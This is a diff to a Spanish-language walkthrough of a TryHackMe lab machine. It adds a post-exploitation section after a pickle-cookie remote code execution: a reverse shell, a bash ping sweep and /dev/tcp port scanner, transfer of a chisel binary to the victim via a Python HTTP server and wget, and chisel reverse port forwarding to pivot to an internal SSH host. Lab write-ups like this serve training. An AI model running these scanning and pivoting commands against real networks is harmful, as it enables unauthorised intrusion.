@@ -15,7 +15,8 @@ tags:
   - Pivot
   - Python
   - Pickle
-  - Django
+  - Bash
+  - RCE
 ---
 
 <p align="center">
@@ -110,8 +111,60 @@ curl -X GET "http://[Ip Machine]:5003/search" -H 'Cookie: search_cookie="[Data S
   <img src="https://github.com/Wiinsad/winsad/blob/master/assets/images/machines/THM/UbaketPie/intrusion/pickle.png?raw=true">
   </p>
 
-  Ya sabiendo que podemos ejecutar comando nos entablarnos una shell a nuestro equipo.
+  Ya sabiendo que podemos ejecutar comando nos entablamos una shell a nuestro equipo.
 
   <p align="center">
   <img src="https://github.com/Wiinsad/winsad/blob/master/assets/images/machines/THM/UbaketPie/intrusion/shell.png?raw=true">
+  </p>
+
+  Enumerando el sistema podemos ver que estamos en un contenedor el cual tiene la ip **[172.17.0.2]** y también se puede ver que el **bash_history** no fue borrado y podemos ver los comando que se ejecutaron en la maquina, en lo que se ve es que existe un segmento de red el cual tiene la ip **[172.17.0.1]** y tiene al parecer el puerto 22 abierto para comprobar esto me cree un script en **bash** para encontrar diferentes host y sus puertos abiertos.
+
+  ```bash
+#!/bin/bash
+
+for i in $(seq 1 254); do
+        timeout 1 bash -c "ping -c 1 172.17.0.$i"  &> /dev/null && echo "[!] HOST 172.17.0.$i" &
+        for port in $(seq 1 65535);do
+                timeout 1 bash -c "echo '' > /dev/tcp/172.17.0.$i/$port" 2>/dev/null && echo $'\t' " [+] Port $port - OPEN" &
+        done; wait
+done; wait
+  ```
+  <p align="center">
+  <img src="https://github.com/Wiinsad/winsad/blob/master/assets/images/machines/THM/UbaketPie/intrusion/script.png?raw=true">
+  </p>
+
+  Como vemos efectivamente tiene el puerto **22** abierto la otra maquina que esta en el otro segmeto de red asi que lo que haremos sera un **pivoting** para saltar a la otra maquina para eso usaremos la herramienta **[chisel](https://github.com/jpillora/chisel)** para hacer un **Port Forwarding**.
+
+  Para esto tienes que compilar el binario de **chisel** puede ser con la primer opción que es una compilación normal ó la segunda que es para reducir su peso sin afectar su funcionamiento:
+
+  - go build .
+
+    ó
+  - go build -ldflags "-s  -w" .
+  - upx burte chisel
+
+  La forma en que yo me comparti el binario a la maquina victima fue mediante el uso de un simple server con **python** usando el comando:
+  ```bash
+  python3 -m http.simple 80
+  ```
+  Y desde la maquina victima usando **wget** aprovehcando que en el **bash_history** se ve que esta disponibles en la maquina.
+  El usdo de chisel es simple, en nustra maquina de atacante tenemos que ejecutarlo de la siguiente forma:
+  ```bash
+  ./chisel server --reverse -p 9090
+  ```
+  Esto es así ya que estamos indicando que queremos montar un server con la propia herramienta de chisel y el parámetro **- -reverse** es para permitir a los clientes especificar un port Forwarding inverso remoto además de las remotas normales y el **-p** sirve para indicar en que puerto local nuestro queremos hacer la tunelización.
+
+  Ahora ya que especificamos esto en nuestra maquina vamos a la maquina victima e ingresamos los siguientes parámetros:
+
+  ```bash
+  ./chisel client [Your IP]]:9090 R:22:172.17.0.1:22
+  ```
+  Aquí estamos especificando que queremos que el chisel actué como cliente a nuestro equipo y por el puerto que configuramos previamente ***(puede ser cualquier puerto escogí esté por que me gusto)*** y con el parámetros **R:** indicamos que sea un remote port Forwarding por el puerto 22 de la maquina victima que es **172.17.0.1** a mi puerto 22.
+
+  Si te preguntas porque no lo hacemos desde nuestra maquina pues es así por que desde nuestra maquina de atacante no tenemos acceso a ese segmento de red pero la maquina que ya comprometimos si lo tiene y lo pudimos verificar a la hora de hacer el host y port discovery con el script en bash que simplemente eran una peticiones **icmp**.
+
+  Ahora ya que hicimos el **port Forwarding** con **chisel** lo podemos verificar con ```lsof -i:22``` y vemos que chisel esta ocupando el puerto **22** de nuestra maquina.
+
+  <p align="center">
+  <img src="https://github.com/Wiinsad/winsad/blob/master/assets/images/machines/THM/UbaketPie/intrusion/portf.png?raw=true">
   </p>
